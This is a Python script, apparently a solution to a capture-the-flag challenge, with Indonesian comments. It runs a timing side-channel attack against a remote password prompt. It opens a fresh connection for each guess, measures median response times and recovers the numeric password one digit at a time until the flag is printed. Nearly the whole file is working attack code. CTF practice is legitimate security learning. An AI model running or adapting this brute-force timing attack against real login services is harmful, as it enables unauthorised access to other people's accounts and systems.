import socket
import time
from statistics import median

HOST = "chals3.apoorvctf.xyz"
PORT = 9001
CHARSET = "0123456789"
SAMPLES = 5 

def read_until(s, suffix):
    data = b""
    while not data.endswith(suffix):
        chunk = s.recv(1)
        if not chunk:
            break
        data += chunk
    return data.decode(errors='ignore')

def measure_time(guess):
    # Buka koneksi baru HANYA untuk satu kali tebakan
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(20.0)
    s.connect((HOST, PORT))

    # Buang banner awal
    read_until(s, b"password: ")

    # Mulai hitung waktu murni saat ngirim password
    start_time = time.perf_counter()
    s.sendall((guess + '\n').encode())
    resp = read_until(s, b"password: ")
    end_time = time.perf_counter()

    s.close()
    return end_time - start_time, resp

def solve():
    # Resume dari 11 digit yang udah pasti benar
    known_password = "93478018909"
    print("[*] Memulai Timing Attack (Metode Koneksi Per-Tebakan)...")

    while True:
        print(f"\n[*] Mencari angka ke-{len(known_password)+1}...")
        times_dict = {}

        for c in CHARSET:
            guess = known_password + c
            times = []

            for _ in range(SAMPLES):
                try:
                    elapsed, resp = measure_time(guess)

                    # Kalau berhasil, pastikan balasan bukan kosong atau Incorrect
                    if "Incorrect" not in resp and resp.strip() != "":
                        print(f"\n[SUCCESS] Flag didapatkan:\n{resp.strip()}")
                        return

                    times.append(elapsed)
                except Exception as e:
                    # Abaikan kalau ada koneksi gagal minor
                    pass

            if times:
                med_time = median(times)
                times_dict[c] = med_time
                print(f"[+] Tebak: {guess:<15} | Waktu Median: {med_time:.5f} detik")

        if not times_dict:
            print("[!] Gagal menghubungi server. Stop.")
            break

        best_char = max(times_dict, key=times_dict.get)
        known_password += best_char
        print(f"[!] Angka terpilih: {best_char} (Password Sementara: {known_password})")

if __name__ == "__main__":
    solve()
